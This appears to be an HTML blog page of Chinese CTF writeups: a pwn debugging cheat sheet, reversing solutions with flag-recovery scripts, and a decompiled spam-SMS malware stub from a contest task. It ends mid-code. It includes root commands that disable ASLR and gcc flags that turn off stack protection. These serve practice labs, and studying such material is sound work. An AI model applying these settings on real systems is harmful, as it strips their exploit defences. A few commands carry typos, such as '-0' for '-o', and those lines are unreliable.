@@ -1,0 +1,958 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>√素顏☃繁華夢☪</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="奋斗中的小白">
+<meta property="og:type" content="website">
+<meta property="og:title" content="√素顏☃繁華夢☪">
+<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:site_name" content="√素顏☃繁華夢☪">
+<meta property="og:description" content="奋斗中的小白">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="√素顏☃繁華夢☪">
+<meta name="twitter:description" content="奋斗中的小白">
+  
+    <link rel="alternate" href="/atom.xml" title="√素顏☃繁華夢☪" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="http://ote495tnr.bkt.clouddn.com/touxiang.jpg">
+    <h2 class="author">XiaoRui</h2>
+    <h3 class="description">奋斗中的小白</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>8</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main">
+  
+    <article id="post-pwntools调试命令集合" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/04/01/pwntools调试命令集合/" class="article-date">
+  <time class="post-time" datetime="2018-04-01T02:29:09.000Z" itemprop="datePublished">
+    <span class="post-month">4月</span><br/>
+    <span class="post-day">01</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/04/01/pwntools调试命令集合/">pwntools调试命令集合</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!--more>
+
+之前做分析pwn题时，命令经常记不住，今天有时间了总结下调试pwn时一直常用的命令。
+
+#### 0x1 编译
+文章中用到的test都是文件名
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gcc test.c -0 test  </div><div class="line">gcc -fno-stack-protector -z execstack -o test test.c</div></pre></td></tr></table></figure>
+<p>使用这条命令编译程序，<code>-fno-stack-protector</code>和<code>-z execstack</code>这两个参数会分别关掉DEP和Stack Protestor。</p>
+<h4 id="0x2-gdb调试技巧"><a href="#0x2-gdb调试技巧" class="headerlink" title="0x2 gdb调试技巧"></a>0x2 gdb调试技巧</h4><ol>
+<li>n：执行一条源代码但不进入函数内部</li>
+<li>ni：执行一条汇编代码但不进入函数内部</li>
+<li>s：执行一条源代码且进入函数内部</li>
+<li>si：执行一条汇编代码且进入函数内部</li>
+<li>c：继续执行到下一个断点</li>
+<li>下断点：b 函数名 或是 b *addr</li>
+<li>查看寄存器的值：info register</li>
+<li>查看内存：x/数字 wx 以十六进制，4字节显示指定内存<pre><code>x/数字 gx 以十六进制，4字节显示指定内存
+</code></pre></li>
+</ol>
+<h4 id="0x3-调试命令"><a href="#0x3-调试命令" class="headerlink" title="0x3 调试命令"></a>0x3 调试命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">checksec  //查看程序开启的保护机制</div></pre></td></tr></table></figure>
+<p>常见的保护措施有以下几种：</p>
+<ol>
+<li><p>CANARY:栈溢出检查，用Canary金丝雀值是否变化来检测,Canary found表示开启。金丝雀最早指的是矿工曾利用金丝雀来确认是否有气体泄漏，如果金丝雀因为气体泄漏而中毒死亡，可以给矿工预警。这里是一种缓冲区溢出攻击缓解手段：启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux将cookie信息称为Canary。</p>
+</li>
+<li><p>FORTIFY:FORTIFY_SOURCE机制对格式化字符串有两个限制：（1）包含%n的格式化字符串不能位于程序内存中的可写地址 （2）当使用位置参数时，必须使用范围内的所有参数。</p>
+</li>
+<li><p>NX:NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过。</p>
+</li>
+<li><p>PIE：PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址。</p>
+</li>
+<li><p>RELRO:RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表。</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cat /proc/sys/kernel/randomize_va_space  //查看地址随机化保护是否开启</div><div class="line">ldd test</div></pre></td></tr></table></figure>
+<p><img src="http://ote495tnr.bkt.clouddn.com/58.png" alt=""></p>
+<p>可以通过这两种方法来查看是否开启了地址随机化保护。控制ASLR有3中状态：<br>0：表示关闭ASLR</p>
+<p>1: mmap base、stack、vdso page将随机化。这意味着.so文件将被加载到随机地址。链接时指定了-pie选项的可执行程序，其代码段加载地址将被随机化。配置内核时如果指定了CONFIG_COMPAT_BRK，randomize_va_space缺省为1。此时heap没有随机化。</p>
+<p>2:在1的基础上增加了heap随机化。配置内核时如果禁用CONFIG_COMPAT_BRK，randomize_va_space缺省为2。</p>
+<p>关闭ASLR，切换至Root用户，输入命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</div></pre></td></tr></table></figure></p>
+<p>开启ASLR，切换至Root用户，输入命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo 2 &gt; /proc/sys/kernel/randomize_va_space</div></pre></td></tr></table></figure></p>
+<h4 id="0x4-端口映射"><a href="#0x4-端口映射" class="headerlink" title="0x4 端口映射"></a>0x4 端口映射</h4><p>目标程序作为一个服务绑定到服务器的某个端口上，可以使用socat这个工具来完成，命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socat TCP4-LISTEN:5555,fork EXEC:./test</div></pre></td></tr></table></figure></p>
+<p>这个程序的IO就被重定向到5555这个端口上，并且可以使用nc 127.0.0.1 5555来访问目标程序服务。</p>
+<h4 id="0x5-文件分析"><a href="#0x5-文件分析" class="headerlink" title="0x5 文件分析"></a>0x5 文件分析</h4><p>查看程序是多少位，可以使用file这条命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">@ubuntu:~/Desktop$ file test</div><div class="line">test: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=76b50d733400542b34d5e8fa23f0f12dc951d4ef, stripped</div></pre></td></tr></table></figure>
+<p>查看系统调用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">strace ./test</div></pre></td></tr></table></figure></p>
+<p>查看操作系统libc的版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dpkg -l | grep libc</div></pre></td></tr></table></figure></p>
+<p>查看pid,但是需要注意的是，先让程序运行再执行命令，否则pid一直在变化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ps -aef | grep file</div></pre></td></tr></table></figure></p>
+<p>查看程序在栈上的权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /proc/[pid]/maps | grep stack</div></pre></td></tr></table></figure></p>
+<p>获取plt函数和函数对应的got表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">objdump -d -j .plt test   //plt表</div><div class="line">objdump -R test           //got表</div></pre></td></tr></table></figure></p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/59.png" alt=""></p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/60.png" alt=""></p>
+<p>.bss段是用来保存全局变量的值，地址固定，并且可以读可写，可以通过如下的命令获取.bss段的地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$ readelf -S test</div><div class="line">....</div><div class="line">[23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</div><div class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4</div><div class="line">  [25] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4</div><div class="line">  [26] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1</div><div class="line">  [27] .comment          PROGBITS        00000000 001020 000034 01  MS  0   0  1</div><div class="line">  [28] .shstrtab         STRTAB          00000000 001054 0000fa 00      0   0  1</div><div class="line">Key to Flags:</div><div class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</div><div class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</div><div class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</div><div class="line">....</div></pre></td></tr></table></figure></p>
+-->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/04/01/pwntools调试命令集合/" data-id="cjfgehm2p0006vgun4o17t7zg" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-西普杯2017年网络安全技能赛-writeup" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/12/10/西普杯2017年网络安全技能赛-writeup/" class="article-date">
+  <time class="post-time" datetime="2017-12-10T09:32:41.000Z" itemprop="datePublished">
+    <span class="post-month">12月</span><br/>
+    <span class="post-day">10</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/12/10/西普杯2017年网络安全技能赛-writeup/">西普杯2017年网络安全技能赛 writeup</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <a id="more"></a>
+<h4 id="0x1-题目1"><a href="#0x1-题目1" class="headerlink" title="0x1 题目1"></a>0x1 题目1</h4><p>描述：近期截获一个拦截发送垃圾短信的恶意软件，在用户手机安装后，会随机向外发送垃圾短信。分析该恶意软件，分析其发送短信的实现点，并还原出要发送的垃圾短信内容。<br>安装到模拟器里，只有一个按钮，但是点击没有任何反应，对apk进行了反汇编，查看java源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">package com.tencent.crasms;</div><div class="line">import android.app.Activity;</div><div class="line">import android.os.Bundle;</div><div class="line">import android.telephony.SmsManager;</div><div class="line">import android.view.View;</div><div class="line">import android.view.View.OnClickListener;</div><div class="line">import android.widget.Button;</div><div class="line">import android.widget.Toast;</div><div class="line">public class MainActivity</div><div class="line">  extends Activity</div><div class="line">&#123;</div><div class="line">  Button a;</div><div class="line">  </div><div class="line">  static</div><div class="line">  &#123;</div><div class="line">    System.loadLibrary(&quot;msyk&quot;);</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  protected void onCreate(Bundle paramBundle)</div><div class="line">  &#123;</div><div class="line">    super.onCreate(paramBundle);</div><div class="line">    setContentView(2130968602);</div><div class="line">    this.a = ((Button)findViewById(2131427420));</div><div class="line">    this.a.setOnClickListener(new View.OnClickListener()</div><div class="line">    &#123;</div><div class="line">      public void onClick(View paramAnonymousView)</div><div class="line">      &#123;</div><div class="line">        try</div><div class="line">        &#123;</div><div class="line">          paramAnonymousView = SmsManager.getDefault();</div><div class="line">          MainActivity.this.rx3sdfx(paramAnonymousView);</div><div class="line">          Toast.makeText(MainActivity.this.getApplicationContext(), &quot;ok&quot;, 0).show();</div><div class="line">          return;</div><div class="line">        &#125;</div><div class="line">        catch (Exception paramAnonymousView)</div><div class="line">        &#123;</div><div class="line">          for (;;) &#123;&#125;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;);</div><div class="line">  &#125; </div><div class="line">  public native void rx3sdfx(SmsManager paramSmsManager);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>分析这段代码，发现它加载了一个<code>msyk</code>的库文件，发送短信功能的函数<code>rx3sdfx</code>并没有实现具体的功能，所以需要去分析这个库文件，看它到底进行了什么样的操作</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/51.png" alt=""></p>
+<p>这段代码就是对短信内容进行处理的方法，算法就是一个简单的异或，但是这里需要注意一点的是v135是由高位和低位组成的（这里比较坑），最后还原出短信的内容为：<code>This Phone has been hacked, SN:8391215</code></p>
+<h4 id="0x2-题目2"><a href="#0x2-题目2" class="headerlink" title="0x2 题目2"></a>0x2 题目2</h4><p>描述：没有后缀，怎么打开，你知道这是什么文件吗？？<br>用十六进制编辑器查看，可以看到文件里面的内容是逆序存放的，将文件内容逆过来就能看到flag </p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/52.png" alt=""></p>
+<p>脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">with open(&apos;reverseMe&apos;,&apos;rb&apos;) as f:</div><div class="line">   with open(&apos;flag&apos;,&apos;wb&apos;) as file:</div><div class="line">      file.write(f.read()[::-1])</div></pre></td></tr></table></figure></p>
+<p>运行的结果为：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/53.png" alt=""></p>
+<h4 id="0x3-题目3"><a href="#0x3-题目3" class="headerlink" title="0x3 题目3"></a>0x3 题目3</h4><p>描述：haha.exe目前无法直接运行，找到启动haha.exe的方法并提交需要的内容。<br>直接运行是不能运行的，需要加参数运行，参数就是正确的key值，如果参数错误则会提示<code>Invalid Key</code>，载入IDA分析，搜索关键字定位到关键代码处</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/48.png" alt=""></p>
+<p>while就是来判断输入的key是否正确，前面需要注意的是，对输入的参数就行了md5加密，然后加密的结果赋值给v86，v86和v16这个数组进行比较</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/49.png" alt=""></p>
+<p>v16这个数组的地址并不是连续的，所以需要把缺少的数值加进去，最后得到v16的数组是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">v16 = 0x5D;</div><div class="line">v17 = 0x41;</div><div class="line">v18 = 0x40;</div><div class="line">v19 = 0x2A;</div><div class="line">v20 = 0xBCu;</div><div class="line">v21 = 0x4B;</div><div class="line">v22 = 0x2A;</div><div class="line">v23 = 0x76;</div><div class="line">v24 = 0xB9u;</div><div class="line">v25 = 0x71;</div><div class="line">v26 = 0x9Du;</div><div class="line">v27 = 0x91u;</div><div class="line">v28 = 0x10;</div><div class="line">v29 = 0x17;</div><div class="line">v30 = 0xC5u;</div><div class="line">v31 = 0x92u;</div></pre></td></tr></table></figure></p>
+<p>得到的md5值为：5d41402abc4b2a76b9719d911017c592，解密后的key值为：hello<br>运行结果：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/50.png" alt=""></p>
+<h4 id="0x4-题目4"><a href="#0x4-题目4" class="headerlink" title="0x4 题目4"></a>0x4 题目4</h4><p>描述：算法很简单，好像无法静态调试啊！啊！<br>提示不能静态分析，只能用OD跟踪，我搜索字符串的时候看到“Congratulations”这样的字符串，以为算法在这里，调试了好几遍都没有输入的信息，然后在入口处下断点返回到它被调用的那个函数里，发现这个函数里有输入，还要计算的过程，然后在这下断点分析算法：</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/55.png" alt=""></p>
+<p>看懂算法之后就可以开始写脚本了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">a = [0xB9 ,0x3A,0xA9,0xD8,0x15, 0x8A, 0xE7 ,0x42,0x69, 0x90, 0xCA, 0xA3, 0x4D, 0xD8, 0xD9, 0xC9 ]</div><div class="line">flag = &quot;&quot;</div><div class="line">for i in range(16):</div><div class="line">    for  j in range(33,128):</div><div class="line">        if ((2*j-6)^j)-2*i==a[i]:</div><div class="line">            flag += chr(j)</div><div class="line">print (flag)</div></pre></td></tr></table></figure>
+<p>运行结果：mBqL!zS6-hLm)XY_</p>
+<h4 id="0x5-题目5"><a href="#0x5-题目5" class="headerlink" title="0x5 题目5"></a>0x5 题目5</h4><p>描述：下断点，然后手工暴力破解<br>在0x400e53下个断点，然后输入一串字符串，一路调试，你会发现经过0x401210这个函数运算后对输入的结果进行了加密</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/56.png" alt=""></p>
+<p>一直往下调试，会将加密的字符串跟正确加密过的字符串进行比较</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/57.png" alt=""></p>
+<p>分析了下它的加密算法，参考了别人的wp，作者说是采用了静态的凯撒加密，但是不行的是每一位加密的字符key值都是不相同的，所以只能去手工爆破，猜测加密的key值，最后爆破出的flag：<br>CTF-BR{riot_in_public_square_vgzdLIEjd}</p>
+<p><a href="https://advancedpersistentjest.com/2016/03/28/writeup-sleeper_cell/" target="_blank" rel="external">https://advancedpersistentjest.com/2016/03/28/writeup-sleeper_cell/</a></p>
+<p><a href="https://github.com/xil-se/xil.se/blob/master/content/post/pwn2win-2016-sleeper-cell-kbeckmann.md" target="_blank" rel="external">https://github.com/xil-se/xil.se/blob/master/content/post/pwn2win-2016-sleeper-cell-kbeckmann.md</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2017/12/10/西普杯2017年网络安全技能赛-writeup/" data-id="cjfgehm3i000pvgunhwhphokv" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Reverse/">Reverse</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-Reverse练习" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/12/05/Reverse练习/" class="article-date">
+  <time class="post-time" datetime="2017-12-05T12:47:04.000Z" itemprop="datePublished">
+    <span class="post-month">12月</span><br/>
+    <span class="post-day">05</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/12/05/Reverse练习/">Reverse练习 writeup</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!--more>
+
+#### 0x1 apk.apk
+反编译之后看java源码，涉及到的关键函数有点多，但是耐心的分析下代码程序的逻辑并不难，通过uc这个函数可以知道程序对“XRL}D6hy4yfE7tuF6{”这个字符串做了加密处理，下面这段程序就它的处理方法
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">public class cc</div><div class="line">&#123;</div><div class="line">  public static String encrypt(String paramString)</div><div class="line">  &#123;</div><div class="line">    String str = &quot;&quot;;</div><div class="line">    int i = 0;</div><div class="line">    if (i &gt;= paramString.length()) &#123;</div><div class="line">      return str;</div><div class="line">    &#125;</div><div class="line">    int j = paramString.charAt(i);</div><div class="line">    char c;</div><div class="line">    if ((j &gt;= 97) &amp;&amp; (j &lt;= 109)) &#123;</div><div class="line">      c = (char)(j + 13);</div><div class="line">    &#125;</div><div class="line">    for (;;)</div><div class="line">    &#123;</div><div class="line">      str = str + c;</div><div class="line">      i += 1;</div><div class="line">      break;</div><div class="line">      if ((j &gt;= 65) &amp;&amp; (j &lt;= 77)) &#123;</div><div class="line">        c = (char)(j + 13);</div><div class="line">      &#125; else if ((j &gt;= 110) &amp;&amp; (j &lt;= 122)) &#123;</div><div class="line">        c = (char)(j - 13);</div><div class="line">      &#125; else if ((j &gt;= 78) &amp;&amp; (j &lt;= 90)) &#123;</div><div class="line">        c = (char)(j - 13);</div><div class="line">      &#125; else if ((j &gt;= 48) &amp;&amp; (j &lt;= 57)) &#123;</div><div class="line">        c = (char)(j ^ 0x7);</div><div class="line">      &#125; else &#123;</div><div class="line">        c = (char)(j ^ 0x6);</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>把这段算法逆向回去就能得到正确的flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">str=&apos;XRL&#125;D6hy4yfE7tuF6&#123;&apos;</div><div class="line">str1=&apos;&apos;</div><div class="line">flag=&apos;&apos;</div><div class="line">for i in range(len(str)):</div><div class="line">    if(ord(str[i])&gt;=97 and ord(str[i])&lt;=109):</div><div class="line">        str1=str1 + chr(ord(str[i])+13)</div><div class="line">    else:</div><div class="line">        str1=str1+str[i]</div><div class="line">for i in range(len(str1)):</div><div class="line">    if(ord(str1[i])&gt;=65 and ord(str1[i])&lt;=77):</div><div class="line">        flag=flag+chr(ord(str1[i])+13)</div><div class="line">    elif(ord(str1[i])&gt;=110 and ord(str1[i])&lt;=122):</div><div class="line">        flag = flag + chr(ord(str1[i]) - 13)</div><div class="line">    elif (ord(str1[i]) &gt;= 78 and ord(str1[i]) &lt;= 90):</div><div class="line">        flag = flag + chr(ord(str1[i]) - 13)</div><div class="line">    elif (ord(str1[i]) &gt;= 48 and ord(str1[i]) &lt;= 57):</div><div class="line">        flag = flag + chr(ord(str1[i]) ^ 7)</div><div class="line">    else:</div><div class="line">        flag = flag + chr(ord(str1[i]) ^ 6)</div><div class="line">print(flag)</div></pre></td></tr></table></figure>
+<p>最后得到的结果是：KEY{Q1hl3lfR0ghS1}</p>
+<h4 id="0x2-Win-exe"><a href="#0x2-Win-exe" class="headerlink" title="0x2 Win.exe"></a>0x2 Win.exe</h4><p>载入IDA分析，找到关键代码处然后分析算法：根据程序的逻辑可以看出来，flag由两部分组成，上部分是由byte_415767这个数组中的字符串组成，并且根据v9这个数组里的值取下标组成上半部分flag，下半部分flag可以直接得到：<code>1024}</code></p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/40.png" alt=""></p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/41.png" alt=""></p>
+<p>解密代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">str=&apos;sKfxEeft&#125;f&#123;gyrYgthtyhifsjei53UUrrr_t2cdsef66246087138\0087138&apos;</div><div class="line">list=[1,4,14,10,5,36,23,42,13,19,28,13,27,39,48,41,42]</div><div class="line">str1=&apos;1024&#125;&apos;</div><div class="line">flag=&apos;&apos;</div><div class="line">for i in list:</div><div class="line">    flag=flag+str[i]</div><div class="line">print(flag+str1)</div></pre></td></tr></table></figure></p>
+<p>运行后法人结果为：KEY{e2s6ry3r5s8f61024}</p>
+<h4 id="0x3-defcamp"><a href="#0x3-defcamp" class="headerlink" title="0x3 defcamp"></a>0x3 defcamp</h4><p>用IDA进行反汇编分析，找到关键代码，可以看到需要用户输入正确的password</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/42.png" alt=""></p>
+<p>函数sub_40074D是一个关键函数，里面有两个for循环，第一个for循环取qword_601080地址上的数据存入v6这个数组，第二个for循环是用v6和v9进行比较，数组v9的值为：<code>5 2 7 2 5 6</code></p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/43.png" alt=""></p>
+<p>但是在主函数中的for循环里面也调用了qword_601080，经过分析可以知道：v3=109+v9[i],所以最后得到的结果为：<code>114 111 116 111 114 115</code>,password就是：<code>rotors</code></p>
+<h4 id="0x4-catalyst-system"><a href="#0x4-catalyst-system" class="headerlink" title="0x4 catalyst-system"></a>0x4 catalyst-system</h4><p>用IDA反汇编，得到如下的伪代码</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/44.png" alt=""></p>
+<p>需要输入username和password，下面5个自定义函数分别对username和password做了相应的处理</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/45.png" alt=""></p>
+<p>将12个字节长的usrname分成3个4字节的int型并做成了方程组:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">a−b+c=1550207830</div><div class="line">3a+3c+b=12465522610</div><div class="line">bc=3651346623716053780</div></pre></td></tr></table></figure></p>
+<p>最后解出：<code>a = 1635017059   b = 1953724780   c = 1868915551</code><br>即username：catalyst_ceo<br>继续分析sub_400977这个函数</p>
+<p><img src="http://ote495tnr.bkt.clouddn.com/46.png" alt=""></p>
+<p>v2这个数组里存的是password，这里v2是等于一个随机数加上一个已知的数得到的，随机数有固定的随机种子srand(a1)，a1是固定的所以产生的随机数也是固定的，这里可以写个C程序跑出来：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdlib.h&gt;</div><div class="line">#include&lt;stdio.h&gt;</div><div class="line">int main() </div><div class="line">&#123;</div><div class="line">	srand(0x454d3e2e);</div><div class="line">	for (int i = 0;i &lt; 10;i++)</div><div class="line">	printf(&quot;%x\n&quot;, rand());</div><div class="line">&#125;</div></pre></td></tr></table></figure>
